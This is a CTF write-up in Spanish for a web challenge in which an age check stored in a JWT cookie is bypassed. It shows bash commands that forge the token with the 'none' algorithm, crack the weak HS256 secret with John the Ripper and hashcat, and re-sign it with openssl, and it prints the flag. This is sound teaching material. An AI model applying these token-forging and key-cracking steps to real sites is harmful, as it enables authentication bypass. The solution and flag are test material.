# 🍺 JaggerWhiskyTequila

## 💭 Concepto


Cuando se accede a la web, se pueden observar distintos tipos de bebida. Al intentar comprar una, nos redirige a la URL `/compra` donde nos aparece el siguiente mensaje:

> No tienes +18 años

Observando las cookies, comprobamos que la página nos ha asignado una con el nombre de `cliente` y con el siguiente valor:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlZGFkIjoxN30.Lq26ql5McZjRfR-2zsTv1Z9UbygMvbbaXP53-QfXO-s
```

Con un poco de práctica, es posible reconocer la estructura de la misma. Las dos primeras letras (`ey`) indican que el comienzo de cadena es el caracter `{` seguido de un espacio o unas comillas. Además, la cookie consta de tres partes delimitadas por puntos.

Por lo tanto, se puede deducir que la solución estará basada en vulnerabilidades conocidas de `JWT`.

> Una pista a mayores es el nombre del reto: **J**agger**W**hisky**T**equila (JWT)

## 📜 Teoría

Lo primero de todo es decodificar la cookie. Para ello podemos hacer uso de herramientas online, como [JWT.io](https://jwt.io/), o segmentar la cadena según el delimitador (en este caso, un punto), dado que JWT sigue el siguiente formato:

![JWT Format](../.img/jwt-format.webp)

En el **Header** se especifica el tipo de formato que se utiliza, así como el algoritmo a usar para cifrar/descifrar los datos.

En el caso del reto, la información obtenida es la siguiente:

```sh
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
# {"typ": "JWT","alg": "HS256"} 
```

> `HS256` indica que el **Payload** está cifrado usando una clave

Si hacemos lo mismo con el segundo fragmento, podemos obtener la información guardada actualmente en la cookie:

```sh
echo -n "eyJlZGFkIjoxN30" | base64 -d
# {"edad":17}
```

Como vimos en la página de `/compra`, el mensaje nos indicaba que no teníamos más de 18 años. Ya sólo queda buscar la manera de modificar el valor de la cookie para especificar una edad mayor.

## 💣 Explotación

Este reto se puede resolver de varias maneras.

---

```yml
Vulnerabilidad: Algoritmo None
```

Aunque hoy en día ya no es habitual encontrarse con este fallo, hay veces que las páginas permiten el uso del algoritmo None o no comprueban la **Signature**.


En el primer caso y con el fin de modificar el **Payload** satisfactoriamente, bastaría con cambiar el valor de `"alg": "HS256"` a `"alg": "none"`.

En el segundo escenario, se puede optar por borrar la **Signature**, aunque no sería necesario.

Podemos generar nuestro nuevo `JWT` usando el siguiente script de **bash**:

```sh
echo -n $(echo -n '{"typ":"JWT","alg":"none"}' | base64).$(echo -n '{"edad":18}' | base64). | tr -d "="
# eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJlZGFkIjoxOH0.
```

Ahora sólo queda reemplazarlo en la página web y recargar la página para obtener la `flag`.

---

```yml
Vulnerabilidad: Clave HS256 débil
```

Es posible que la clave usada para firmar el **Payload** no sea lo suficientemente fuerte, por lo que sería viable realizar un ataque de fuerza bruta para averiguarla.

La forma estándar de hacerlo es con programas como `JohnTheRipper` o `HashCat`.

Para ello, debemos guardar el valor de la cookie en un fichero:

```sh
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlZGFkIjoxN30.Lq26ql5McZjRfR-2zsTv1Z9UbygMvbbaXP53-QfXO-s" > jwt.hash
```

Una vez guardado, podemos usar diccionarios como `rockyou.txt` para realizar el ataque:

```sh
# Usando JohnTheRipper
john jwt.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Usando HashCat
hashcat -m 16500 jwt.hash /usr/share/wordlists/rockyou.txt
```

En ambos casos, nos dará la clave usada para firmar los datos: `alcoholic`.

Para editar el contenido, podemos hacer uso de herramientas online (como [JWT.io](https://jwt.io/)) o generarla mediante este script en `bash`:

```sh
token=`echo -n $(echo -n '{"typ":"JWT","alg":"HS256"}' | base64).$(echo -n '{"edad":18}' | base64) | tr -d "=" | tr '/+' '_-'`; sign=$(echo -n ${token} | openssl dgst -sha256 -hmac "alcoholic" -binary | base64 | tr -d "=" | tr '/+' '_-'); echo -n "${token}.${sign}"

# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlZGFkIjoxOH0.E17PNNNY9mUUNT4VJdKMlMilOP0hZc5ihlMBdar6cCM
```

Igual que antes, sólo queda reemplazar el nuevo token en la página y recargar para obtener la `flag`.

## 🏁 Flag

```
pumaCTF{JwT_4lc0h0l_n_h4nG0v3R}
```